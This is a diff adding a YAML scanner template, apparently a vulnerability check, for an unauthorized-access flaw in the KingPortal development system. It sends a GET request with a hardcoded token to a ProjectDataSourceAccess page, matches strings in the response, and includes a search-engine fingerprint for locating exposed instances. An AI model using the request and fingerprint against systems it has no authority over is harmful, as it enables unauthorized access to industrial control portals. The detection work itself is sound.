@@ -1,0 +1,16 @@
+id: poc-yaml-kingportal-projectdatasourceaccess-unauthorized-access
+info:
+  name: 北京亚控科技KingPortal开发系统 ProjectDataSourceAccess 未授权访问漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: KingPortal开发系统
+  hunter: web.title="KingPortal 开发系统客户端"
+requests:
+- method: GET
+  path: /views/ProjectDataSourceAccess.html?token=2ccdf191078bd4e8e85b526ec44f7dd31ad7cf81&refreshToken=null
+  expression: "status_code == 200 && \ncontains(body,\"onClick:OnCommond_NodeSelect\"\
+    ) &&\ncontains(body,\"当前工程节点\") &&\ncontains(body,\"ProjectDataSourceAccess.js\"\
+    )\n"
+variables: {}
+transport: http
